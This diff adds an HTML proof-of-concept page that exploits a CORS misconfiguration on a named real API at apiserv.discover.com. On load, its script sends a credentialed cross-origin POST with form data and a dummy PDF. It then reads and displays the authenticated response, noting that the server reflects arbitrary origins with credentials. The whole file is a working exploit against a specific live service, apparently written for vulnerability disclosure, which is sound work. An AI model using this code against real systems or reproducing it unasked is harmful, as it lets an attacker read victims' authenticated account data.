@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>CORS PoC — Discover apiserv.discover.com</h3>
+<p>Page origin: <span id="origin"></span></p>
+<pre id="output">Running...</pre>
+<script>
+document.getElementById('origin').textContent = window.location.origin;
+
+async function run() {
+  const formData = new FormData();
+  formData.append('requestId', 'req-poc-test-' + Date.now());
+  formData.append('InputVariables', JSON.stringify([
+    {"Id":"PVARMOBJFOLDER","Value":"test"},
+    {"Id":"PVARPROCESSNAME","Value":"COP"}
+  ]));
+  const blob = new Blob(['%PDF-1.7 test'], {type: 'application/pdf'});
+  formData.append('file', blob, 'poc.pdf');
+
+  try {
+    const res = await fetch('https://apiserv.discover.com/enterprise/imaging/connectivity/v1/connectivityRequest', {
+      method: 'POST',
+      credentials: 'include',
+      body: formData
+    });
+    const text = await res.text();
+    document.getElementById('output').textContent =
+      'Status: ' + res.status + '\nBody: ' + text +
+      '\n\n^ This response was read by JavaScript running on ' + window.location.origin +
+      ', a completely unrelated origin, because the server reflects arbitrary Origin headers with credentials enabled.';
+  } catch (e) {
+    document.getElementById('output').textContent = 'Fetch blocked: ' + e.message;
+  }
+}
+run();
+</script>
+</body>
+</html>
